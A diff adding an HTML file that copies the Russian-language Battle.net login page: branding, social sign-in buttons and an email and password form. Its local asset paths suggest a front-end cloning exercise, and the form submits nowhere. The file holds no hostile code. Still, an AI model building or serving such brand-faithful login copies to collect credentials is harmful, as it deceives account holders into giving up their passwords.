@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="57x57" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/Users/ruslan/Desktop/battle.net/iconbatt/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/Users/ruslan/Desktop/battle.net/iconbatt/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/Users/ruslan/Desktop/battle.net/iconbatt/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/Users/ruslan/Desktop/battle.net/iconbatt/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/Users/ruslan/Desktop/battle.net/iconbatt/favicon-16x16.png">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="stylesheet" href="style.css">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>Авторизация в Battle.net</title>
+</head>
+<body>
+    <div class="grid_container">
+        <div class="box_wrapper">
+            <div class="box_wrapper_inner">
+                <img class="logo" src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/logo-horizontal-color-light.1z1fI.svg.png" alt="">
+                <div class="login">
+                    
+                    <h3 id="login_header">Авторизоваться</h3>
+                    <div class="log_in_via">
+                        <form class="appleid" action="https://accounts.google.com/ServiceLogin?hl=ru" method="GET">
+                            <button id="google" role="column" class="btn" rel="external" aria-label="Авторизоваться с помощью Google" title="Авторизоваться с помощью Google" tabindex="0">
+                                <img class="photo" src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/google.png" alt="">
+                                <i class="icon-google"></i>
+                            </button>
+                        </form>
+                        
+                        <form class="appleid" action="https://m.facebook.com/login/?locale=ru_RU&refsrc=deprecated" method="GET">
+                            <button id="facebook" role="row" class="btn" rel="external" aria-label="Авторизоваться с помощью Facebook" title="Авторизоваться с помощью Facebook" tabindex="0">
+                                <img src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/facebook.png" alt="">
+                                <i class="icon-facebook"></i>
+                            </button>
+                        </form>
+                        <form class="appleid" action="https://appleid.apple.com/" method="GET">
+                            <button id="apple" role="row" class="btn" rel="external" aria-label="Авторизоваться с помощью Apple" title="Авторизоваться с помощью Apple" tabindex="0">
+                                <img class="photo" src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/apple.png" alt="">
+                                <i class="icon-apple"></i>
+                            </button>
+                        </form>
+                    </div>
+                    <div class="log_in_via">
+                        <form class="appleid" action="https://login.live.com/" method="GET">
+                            <button id="xbox" role="column" class="btn" rel="external" aria-label="Авторизоваться с помощью Xbox Network" title="Авторизоваться с помощью Xbox Network" tabindex="0">
+                                <img class="photo" src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/xbox.png" alt="">
+                                <i class="icon-xbox"></i>
+                            </button>
+                        </form>
+                        <form class="appleid" class="sony" action="https://my.account.sony.com/central/signin/?client_id=b5b165c3-4146-4a8e-822b-1116fd3b96d0&response_type=code&state=AT9LbhqBgHMErK6Osucl6W28OJNkknrBMNdxudeF8E1xqXifblRVgZ28lu6mH_k0IWlXpvP7I4R0syeMUx2puvUy6kUK5MjKVJPep96psKMBa7PBZdlNQsuNx0yscX-mzXYX-YcBRfaDmTik3Cbk6nkNkNjsU_6dE927z5Xmelaw8UkHoKxEmR8-As-JI63MjICdb5CkbAJJkiRVT4fjNJ-pnGMUZXc8mTYJNVSk1VIB7VY5o8hSACKR5HGwQj_AzgOcZi_GvA5bJGfQ8fPUhXQxH07mZxXhdZ9F64nltRiFVZB4Eenj5RXPxviq0hx6213EpxYkM6MrYs3U5iw3lhtP-qDRumnqD9X_wHMwnevMFKRBrw5ALNKxUYTPOe-saYiYXh-GnUsU1so2cYZYCm-JEbO1Kis0K_cOCYn8gkgbHlMmOSKSIgXAfMx71NOkYQt1Xo_bmf6rKRy8iRy6Oi55T0nhkQKb34eCiFHKvCWsZbfNvrtLuQp2LVrBrlx27nKa7go6ek7M6hHbQ21VsqV59jxa1G9j93mxc592DmP-hq_6dX_RzkXp1TPzSZRC2PpGmcGr9ZJJM7d2dFmSF-LZZknMpPscRvuyhdUEfEMnhQySrNuVOQWvvsSpHqDIoGtG_2AQLZJQG_Tk9if7CKM%3D&scheme&deviceProof=882b8c7a7296c5f428dd2febe9ad94126a4852d925c547495c46debe3bc8c860&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Fpsn&scope=psn%3As2s&isMASDK=false&cid=d679d95f-987e-4576-a80f-7c797469e770&error=login_required&error_code=4165&no_captcha=false#/signin/ca?entry=ca" method="get">
+                            <button id="sony" role="row" class="btn" rel="external" aria-label="Авторизоваться с помощью PlayStation™Network" title="Авторизоваться с помощью PlayStation™Network" tabindex="0">
+                                <img src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/sony.png" alt="">
+                                <i class="icon-sony"></i>
+                            </button>
+                        </form>
+                        <form class="appleid" action="https://accounts.nintendo.com">
+                            <button id="nintendo" role="row" class="btn" rel="external" aria-label="Авторизоваться с помощью Nintendo" title="Авторизоваться с помощью Nintendo" tabindex="0">
+                                <img class="photo" src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/nintendo.png" alt="">
+                                <i class="icon-nintendo"></i>
+                            </button>
+                        </form>
+                        <form class="appleid" action="https://steamcommunity.com" method="get">
+                            <button id="steam" role="row" class="btn" rel="external" aria-label="Авторизоваться с помощью Steam" title="Авторизоваться с помощью Steam" tabindex="0">
+                                <img class="photo" src="/Users/ruslan/Desktop/battle.net/eu.account.battle.net by html.to.design ❤️ FREE version - 10/09/steam.png" alt="">
+                                <i class="icon-steam"></i>
+                            </button>
+                        </form>
+                    </div>
+                    <div class="line">
+                        <span>
+                            или войти через
+                        </span>
+                    </div>
+                    <form action="" method="post" id="password-form" novalidate="novalidate" class="username-required input-focus form-with-captcha">
+                        <div id="login_input_container" class="">
+                            <div class="control-group ">
+                                <label id="accountName-label" class="control-label" for="accountName"></label>
+                                    <div class="controls">
+                                        <input id="accountName" aria-label="Поле электронной почты или телефона. Введите электронный адрес или телефонный номер." name="accountName" title="Электронная почта или телефон" maxlength="320" type="text" tabindex="0" class="input-block " placeholder="Электронная почта или телефон" autocorrect="off" spellcheck="false">
+                                        <span class="input-after"></span>
+                                        <span class="error-helper error-helper-accountName hide">
+                                        </span>
+                                    </div>
+                                </div>
+                            <div class="control-group ">
+                                <label id="password-label" class="control-label" for="password"></label>
+                                <div class="controls">
+                                    <div class="blz-password-wrapper">
+                                        <input id="password" aria-label="Поле пароля. Введите пароль." name="password" title="Пароль" maxlength="128" type="password" tabindex="0" class="input-block " autocomplete="off" placeholder="Пароль" autocorrect="off" spellcheck="false" data-password-show-aria="Показать пароль" data-password-hide-aria="Скрыть пароль"><span class="view-password-button" tabindex="0" aria-live="assertive" role="button"><i class="show-password fas fa-eye" aria-label="Показать пароль"></i><i class="hide-password hide fas fa-eye-slash" aria-label="Скрыть пароль"></i></span><span class="caps-lock-indicator hide"><i class="fas fa-arrow-alt-square-up"></i></span></div>
+                                        <span class="input-after"></span>
+                                        <span class="error-helper error-helper-password hide"></span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="control-group submit no-cancel">
+                                <button type="submit" id="submit" class="btn buttonau" data-loading-text="" tabindex="0" aria-label="Авторизация">
+                                    Авторизоваться
+                                    <i class="spinner-battlenet"></i>
+                                </button>
+                            </div>
+                            <ul id="help-links" role="navigation">
+                                <li role="link">
+                                    <a rel="internal" href="https://account.battle.net/creation/?ref=https%3A%2F%2Foauth.battle.net%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.blizzard.com%252Fauth%252Fbnet%252Fcallback%26scope%3Dlogout%2520account.licenses%2520email%2520name%2520private_flags%2520primary-address%2520account.full%2520reference.basic%26client_id%3D3d87a4f120754e15840548b68d9ea4db&amp;theme=bnet-next&amp;app=oauth&amp;hostingApp=oauth&amp;flowTrackingId=7c150b4d-c834-486a-a9cf-9816739a3a3d&amp;bdp=882b8c7a7296c5f428dd2febe9ad94126a4852d925c547495c46debe3bc8c860" tabindex="0" id="signup" role="button">
+                                    Зарегистрируйте учетную запись Battle.net бесплатно
+                                    </a>
+                                </li>
+                                <li role="link">
+                                    <a rel="internal" target="_blank" href="https://account.battle.net/recovery/?ref=&amp;theme=bnet-next&amp;app=oauth&amp;hostingApp=oauth&amp;flowTrackingId=7c150b4d-c834-486a-a9cf-9816739a3a3d" tabindex="0" id="loginSupport" role="button">
+                                    Вы не можете войти?
+                                    </a>
+                                </li>
+                            </ul>
+                        </form>
+                </div>
+            </div>
+            <footer class="footer">
+                <div class="nav-client">
+                    <div class="footer-content">
+                        <div class="nav-section">
+                            <div class="nav-left">
+                                <div class="footer-links nav-left">
+                                    <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Battle.net EULA</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Privacy</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Terms</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Copyright Infringement</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Cookies</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a"  href="https://www.blizzard.com/company/legal/eula">Cookie Settings</a>
+                                    <div class="copyright">
+                                        ©2023 Blizzard Entertainment, Inc. All rights reserved.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+            </div>
+        </div>
+
+
+
+
+        
+    
+   
+</body>
+</html>
